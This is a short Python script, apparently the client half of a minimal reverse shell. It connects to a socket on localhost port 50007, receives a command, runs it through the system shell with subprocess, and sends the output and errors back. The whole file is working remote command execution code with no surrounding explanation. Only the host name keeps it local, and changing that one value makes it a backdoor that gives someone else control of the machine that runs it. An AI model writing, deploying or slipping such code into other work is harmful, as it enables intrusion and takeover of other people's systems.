import socket
import subprocess

HOST = 'localhost'
PORT = 50007

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.send('Connected'.encode())
    
    command = s.recv(1024)
    command = command.decode(encoding= "ISO-8859-1")
    print(command)

    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    
    s.send(output + output_error)

  